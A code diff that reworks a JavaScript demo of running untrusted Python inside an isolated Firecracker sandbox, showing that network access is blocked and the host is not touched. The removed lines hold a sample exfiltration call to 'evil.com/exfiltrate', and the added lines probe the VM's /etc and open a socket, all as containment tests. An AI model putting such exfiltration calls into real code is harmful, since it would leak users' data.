@@ -1,53 +1,58 @@
 import { Sandbox } from "@omnirun/sdk";
 
 /**
- * Run untrusted code in an isolated Firecracker microVM.
+ * Sandboxed Skill Runner
+ *
+ * Demonstrates running untrusted code in an isolated Firecracker microVM.
  * The code cannot access the host filesystem, network, or processes.
  */
-async function runInSandbox(code, language = "python") {
-  const sandbox = await Sandbox.create("python-3.11", {
-    timeout: 30,
-    internet: false,
-  });
 
-  try {
-    const result = await sandbox.runCode(code, language);
-    return { stdout: result.stdout, stderr: result.stderr, exitCode: result.exitCode };
-  } finally {
-    await sandbox.kill().catch(() => {});
-  }
-}
+console.log("Creating isolated sandbox...");
+const sandbox = await Sandbox.create("python-3.11", {
+  timeout: 60,
+  internet: false,
+});
+console.log(`Sandbox: ${sandbox.sandboxId}\n`);
 
-// Demo: run safe code
-console.log("=== Running safe code ===");
-const safe = await runInSandbox(`
-import platform
+try {
+  // Demo 1: Run safe code
+  console.log("=== Running safe code ===");
+  const safe = await sandbox.runCode(
+    `import platform
 print(f"Python {platform.python_version()}")
 print(f"OS: {platform.system()}")
-print("Hello from inside a Firecracker VM!")
-`);
-console.log(safe.stdout);
+print("Hello from inside a Firecracker VM!")`,
+    "python",
+  );
+  console.log(safe.stdout);
 
-// Demo: malicious code that tries to access host — fails safely
-console.log("=== Attempting host access (will fail safely) ===");
-const malicious = await runInSandbox(`
-import os
-# This runs inside an isolated VM — NOT on your host
+  // Demo 2: Code that explores the VM filesystem (not YOUR filesystem)
+  console.log("=== Exploring the sandbox filesystem ===");
+  const explore = await sandbox.runCode(
+    `import os
+files = os.listdir("/etc")
+print(f"Found {len(files)} files in /etc — but this is the VM's /etc, not yours!")
+print(f"Hostname: {os.uname().nodename}")
+print(f"User: {os.getenv('USER', 'root')}")`,
+    "python",
+  );
+  console.log(explore.stdout);
+
+  // Demo 3: Network access blocked
+  console.log("=== Attempting network access (blocked) ===");
+  const network = await sandbox.runCode(
+    `import socket
 try:
-    files = os.listdir("/etc")
-    print(f"Found {len(files)} files in /etc — but this is the VM's /etc, not yours!")
-except Exception as e:
-    print(f"Access denied: {e}")
+    socket.create_connection(("1.1.1.1", 80), timeout=2)
+    print("ERROR: Network access should be blocked!")
+except (OSError, socket.timeout) as e:
+    print(f"Network blocked: {type(e).__name__} — sandbox has no internet access")
+    print("Untrusted code cannot exfiltrate data.")`,
+    "python",
+  );
+  console.log(network.stdout);
 
-# Try network access — blocked by internet: false
-import urllib.request
-try:
-    urllib.request.urlopen("https://evil.com/exfiltrate", timeout=3)
-    print("Network access succeeded — THIS SHOULD NOT HAPPEN")
-except Exception as e:
-    print(f"Network blocked: {type(e).__name__}")
-`);
-console.log(malicious.stdout);
-console.log(malicious.stderr ? `stderr: ${malicious.stderr}` : "");
-
-console.log("=== Host machine is completely untouched ===");
+  console.log("=== Host machine is completely untouched ===");
+} finally {
+  await sandbox.kill().catch(() => {});
+}
